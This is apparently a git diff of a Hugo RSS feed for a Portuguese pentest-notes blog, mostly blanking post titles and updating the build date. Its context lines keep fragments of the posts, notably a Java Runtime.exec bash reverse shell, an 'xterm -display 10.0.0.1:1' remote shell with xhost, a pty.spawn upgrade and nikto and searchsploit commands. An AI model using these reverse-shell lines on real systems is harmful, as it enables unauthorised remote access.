@@ -7,10 +7,10 @@
     <ttl>1440</ttl>
     <generator>Hugo 0.73.0</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 23 Jul 2020 03:27:44 UT</lastBuildDate>
+    <lastBuildDate>Thu, 23 Jul 2020 03:35:09 UT</lastBuildDate>
     <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>Wordlist com Palavras do Site</title>
+      <title></title>
       <link>/posts/wordlist/</link>
       <pubDate>Thu, 23 Jul 2020 02:58:13 UT</pubDate>
       <guid>/posts/wordlist/</guid>
@@ -46,7 +46,7 @@ _|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: getSu
 ]]></content:encoded>
     </item>
     <item>
-      <title>sh_MSFvenom</title>
+      <title></title>
       <link>/posts/sh_msfvenom/</link>
       <pubDate>Thu, 23 Jul 2020 02:25:57 UT</pubDate>
       <guid>/posts/sh_msfvenom/</guid>
@@ -59,7 +59,7 @@ $ python3 -c &amp;quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&amp;quot;
 ]]></content:encoded>
     </item>
     <item>
-      <title>The_silver_searcher</title>
+      <title></title>
       <link>/posts/the_silver_searcher/</link>
       <pubDate>Thu, 23 Jul 2020 02:17:35 UT</pubDate>
       <guid>/posts/the_silver_searcher/</guid>
@@ -72,7 +72,7 @@ apt-get install silversearcher-ag
 ]]></content:encoded>
     </item>
     <item>
-      <title>Netcat</title>
+      <title></title>
       <link>/posts/netcat/</link>
       <pubDate>Thu, 23 Jul 2020 02:02:18 UT</pubDate>
       <guid>/posts/netcat/</guid>
@@ -90,7 +90,7 @@ Ou seja, com ele podemos ouvir a porta TCP/UDP podemos colocar o nc escutando na
 ]]></content:encoded>
     </item>
     <item>
-      <title>Reverse Shell</title>
+      <title></title>
       <link>/posts/dicasdereverseshell/</link>
       <pubDate>Thu, 23 Jul 2020 01:51:31 UT</pubDate>
       <guid>/posts/dicasdereverseshell/</guid>
@@ -113,7 +113,7 @@ r = Runtime.getRuntime() p = r.exec([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&
 xterm -display 10.0.0.1:1 Xnest :1 xhost &#43;targetip ]]></content:encoded>
     </item>
     <item>
-      <title>Nikto</title>
+      <title></title>
       <link>/posts/nikto/</link>
       <pubDate>Thu, 23 Jul 2020 01:47:23 UT</pubDate>
       <guid>/posts/nikto/</guid>
@@ -134,7 +134,7 @@ ex: nikto -h http://192.168.0.126/files -p 8081, 443 -o scan.html
 ]]></content:encoded>
     </item>
     <item>
-      <title>Searchexploit</title>
+      <title></title>
       <link>/posts/searchexploit/</link>
       <pubDate>Thu, 23 Jul 2020 01:46:40 UT</pubDate>
       <guid>/posts/searchexploit/</guid>
@@ -153,7 +153,7 @@ $ sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
 ]]></content:encoded>
     </item>
     <item>
-      <title>NMAP</title>
+      <title></title>
       <link>/posts/toolsforpentest/</link>
       <pubDate>Wed, 15 Jul 2020 18:02:31 UT</pubDate>
       <guid>/posts/toolsforpentest/</guid>
